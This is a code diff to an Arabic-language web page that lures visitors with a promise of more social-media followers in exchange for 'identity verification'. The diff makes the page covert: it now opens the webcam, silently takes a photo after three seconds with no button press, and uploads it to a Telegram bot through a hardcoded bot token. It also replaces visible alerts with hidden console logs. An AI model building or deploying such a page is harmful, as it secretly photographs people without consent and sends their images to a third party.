@@ -6,30 +6,32 @@
   <style>
     body { text-align: center; font-family: sans-serif; background: #f2f2f2; }
     video, canvas { margin: 10px; border: 2px solid #000; }
-    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
   </style>
 </head>
 <body>
-  <h2>تأكيد الهوية لزيادة المتابعين</h2>
-  <p>يرجى السماح للكاميرا والتقاط صورة لتأكيد الهوية</p>
-  
-  <video id="video" width="300" autoplay></video>
-  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas><br>
-  <button onclick="capture()">التقاط وإرسال</button>
+  <h2>جارٍ التحقق من الهوية...</h2>
+  <p>يرجى الانتظار، يتم التحقق تلقائيًا</p>
+
+  <video id="video" width="300" autoplay muted></video>
+  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
+    // إعداد الكاميرا
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => video.srcObject = stream)
-      .catch(err => alert("فشل الوصول إلى الكاميرا: " + err));
+      .then(stream => {
+        video.srcObject = stream;
 
-    function capture() {
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(sendToTelegram, 'image/jpeg');
-    }
+        // بعد 3 ثواني من تشغيل الكاميرا، يتم الالتقاط والإرسال
+        setTimeout(() => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(sendToTelegram, 'image/jpeg');
+        }, 3000);
+      })
+      .catch(err => alert("فشل الوصول إلى الكاميرا: " + err));
 
     function sendToTelegram(blob) {
       const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
@@ -43,10 +45,10 @@
         body: formData
       })
       .then(res => {
-        if (res.ok) alert("تم إرسال الصورة بنجاح");
-        else alert("فشل الإرسال");
+        if (res.ok) console.log("تم الإرسال");
+        else console.log("فشل الإرسال");
       })
-      .catch(err => alert("خطأ في الإرسال: " + err));
+      .catch(err => console.error("خطأ في الإرسال: " + err));
     }
   </script>
 </body>
